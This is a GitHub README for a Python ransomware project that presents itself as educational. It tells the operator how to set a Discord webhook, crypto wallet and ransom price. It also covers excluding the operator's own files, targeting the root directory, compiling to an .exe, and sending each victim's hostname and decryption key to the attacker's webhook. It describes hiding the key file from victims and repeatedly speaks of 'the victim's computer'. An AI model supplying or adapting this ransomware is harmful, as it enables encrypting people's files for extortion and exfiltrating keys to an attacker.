![This is an image](https://i.ibb.co/CV9mKzD/Background.png)



<h1 align="center">RANSOMWARE.PY</h1>

<div align="center">
  <strong>Ransomware made with python, open-source project.</strong>
  <br>
  <br>

  <a href="https://travis-ci.com/kyb3r/dhooks">
    <img src="https://img.shields.io/travis/com/kyb3r/dhooks/master.svg?style=for-the-badge&colorB=06D6A0" alt="Travis" />
  </a>
  
  <a href="https://test-dhooks-doc.readthedocs.io/en/latest/?badge=latest">
    <img src="https://img.shields.io/readthedocs/dhooks.svg?style=for-the-badge&colorB=E8BE5D" alt="Documentation Status" />
  </a>

  <a href="https://github.com/kyb3r/dhooks/">
    <img src="https://img.shields.io/pypi/pyversions/dhooks.svg?style=for-the-badge&colorB=F489A3" alt="Py Versions" />
  </a>

  <a href="https://pypi.org/project/dhooks/">
    <img src="https://img.shields.io/pypi/v/dhooks.svg?style=for-the-badge&colorB=61829F" alt="PyPi" />
  </a>

  <a href="https://github.com/kyb3r/dhooks/blob/master/LICENSE">
    <img src="https://img.shields.io/github/license/kyb3r/dhooks.svg?style=for-the-badge&colorB=7289DA" alt="LICENSE" />
  </a>
</div>
<br>



Here is an open-source program that allows you to understand the creation of a ransomware via **python**. I remind you that this is only for **educational purposes**, I am not responsible for any problems related to these scripts.

- **How it works ?**

In order to be able to encrypt the files and decrypt them, I use the `cryptography.fernet` module. This module allows to encrypt a message or files only accessible with a decryption key.

If you want to convert the .py file into a `.exe` file its possible ! Using [pyinstaller](https://pyinstaller.org/en/stable/)

### Reminder...

![EDUCATIONPURPOSESONLY](https://i.ibb.co/NxbHwyM/winmiwnrih.png)

## Authors

- [@zaqoQLF](https://www.github.com/zaqoQLF)


## Installation Windows
![Logo](https://i.ibb.co/tJBNv9x/Screenshot-2022-05-24-at-8-07-34-PM.png)

In order to be able to install all the dependencies you will need to have `pip` installed and run the commands below. If you are on **Windows/Linux/Mac** run one of the following commands :

```bash
  git clone https://github.com/zaqoQLF/ransomware-python.git
```

```bash
  pip3 install -r requirements.txt or pip install -r requirements.txt
```

Or run the file `setup.py` and choose which type of installation you want.
```bash
  python3 setup.py
```

Or install all dependencies one by one : 

```bash
  pip install os
  pip install time
  pip install socket
  pip install cryptography
  pip install discord_webhook
  pip install colorama
  pip install binascii
```

In the `ransomware.py` can modify some values like the `Discord Webhook`, your CryptoCurrency Wallet, the requested price, and the currency desired.

```python
  class ransomware:
    def __init__(self):
        self.files_to_encrypt = []
        self.KeyStore = []
        self._keyEncrypt = Fernet.generate_key()
        self.dc_webhook = DiscordWebhook("Your Discord Webhook Here")
        self.wallet_url = "YOUR WALLET URL"
        self.priceToAsk = "Price To Ask Here"
        self.currency = "Crypto Currency Choice"
  ```
  
In case you don't want to encrypt some files, you can specify it as I did in this line of code below.
- Attention, you must write the file name similar to the file you do not want to encrypt

So if you want to add `DoNotEncryptMe.txt` just add a line of code after the `setup.py` like this:

Do this for the 2 functions, its very important cause if you don't do that it will encrypt your files, or decrypt it.
But in the case you want to encrypt all victim's files, don't touch anything.

```python
   ... or file == 'DoNotEncryptMe.txt':
```
```python
    # In the encrypt_files function
    if file == 'ransomware.py' or file == 'rkey.key' or file == 'encryptionCheck.txt' or file == 'requirements.txt' or file == 'setup.py' or file == 'ADD YOUR FILE NAME HERE':
```
```python
    # In the decrypt_files function
    if file == 'ransomware.py' or file == 'rkey.key' or file == 'encryptionCheck.txt' or file == 'requirements.txt' or file == 'setup.py' or file == 'ADD YOUR FILE NAME HERE':
```
    
## Running Scripts

![Logo](https://i.ibb.co/1qGfTKF/Screenshot-2022-05-24-at-8-06-10-PM.png)

To be able to execute the files you will have to run these commands

The script must run on your victim computer, or if you want to try you can ! but in a empty directory to avoid the encryption of all your files.
```python
  python3 ransomware.py
```
**[ ! ] Run it a first time will encrypt all files, running a second time will detect that the encryption already been applied so it will requests the key to decrypt all victim's file**


By default the files which will be encrypted will be those which are in the current working directories, to specify the path you can add this for example:
for more information click [here](https://www.geeksforgeeks.org/python-os-listdir-method/)

```python 
  path = "/"   # "/" correspond to the root file but you can custom with a custom path example C: Boot or D:/
  for file in os.listdir(path): # then specify the path as parameter
```

If the decryption key correspond it will shows you this:

![Decryption Accepted](https://i.ibb.co/1s4RSrg/rightkey.png)

Else, it will return an error and keep your files encrypted until you have the right decryption key :

![Decryption Rejected](https://i.ibb.co/D5MngLn/incorrect-Key.png)

## How Encryption works ?

The encryption will change all your victim's current file (in the directory chosen) by an encryption that will be only readable/decryptable with a key. ( The key will be send on Discord with webhook, you need to put the link of your webhook in the `self.dc_webhook = ""`).

Regarding encryption, all the encryption you will do will be automatically in bytes which means that you must decode -> strings to be able to use your variables or whatever you want.

In this script everything has already been done but if you want for example to send the key via email/smtp or other you will have to decode it.
- Here is a code sample :
```python
    from cryptography.fernet import Fernet

    key_encryption = Fernet.generate_key()

    _Key = Fernet(key_encryption)

    TextToEncrypt = _Key.encrypt(b'Hello World !') # Need to be in bytes

    # Output of TextToEncrypt : b'gAAAAABijpAFxDE5pe5EJHIPgdtfRNvSvk81wEXyueyyKhDYWt-0w13c2eJVFNBUmxB0WVTvnVccYxP0MrlM9asNC-oLLZ1mZQ=='

    # Then decrypt

    DecryptText = _Key.decrypt(TextToEncrypt) # Output : b'Hello World !'

    # As you see it will be in Bytes so to decode it to turn this variable into strings : 

    print(DecryptText.decode()) 

    # Output -> Hello World !
```

For example i got here a `.txt.` file and i will encrypt it.

![txt file](https://i.ibb.co/pR56FRT/hello-World.png)

So, first of all in my directory i only got this txt file and my script, you can make some exception to avoid encryption on some specified files.
If i run my script it will encrypt it and it will be not readable anymore until the victim's got the key

After that, few files will be created, first an `encryptionCheck.txt` will be create on the victim's computer this file will be used to check if this file exist. If its not it will encrypt all the file and if it already exist it will just ask the victim a ransom. So its a way to check if the encryption already been executed or not.

This `encryptionCheck.txt` is very useful but not the smarter way to do it but it makes the script more easier to understand and like this all the code is in one and unique script. 

After the encryption check file done, it will create a `rkey.key` file on the computer's victim. This will store the key in it but the victim will in no way know that the key is on his computer, moreover it will be mixed with a lot of files so impossible to find it for the victim. Since the files will have been modified, "The quick access" (folder on your computer) will be spammed by all the modified files, so it is impossible to find this key. 

Hello World File afer encryption : 

![AfterEncryption](https://i.ibb.co/ZGy4p3b/wuinduaw.png)

[!] To decrypt the victim files he will need the encryption key, you will receive it by webhook through discord webhook.
  
## Discord Webhooks

![App Screenshot](https://i.ibb.co/cQ7z9Y8/Screenshot-2022-05-24-at-8-09-39-PM.png)

- In this code there is a system that allows you to receive via webhook the hostname on which computer the ransomware was executed as well as the decryption key. 

- [FIXED - WORKS] For the moment the key cannot be used but you can change that by putting an input in the script and converting the string to bytes, base64 url-safe

![App Screenshot](https://i.ibb.co/KFSn0dQ/webhook2.png)

## Screenshot of Shell
![App Screenshot](https://i.ibb.co/RDNbssh/ransomware.png)


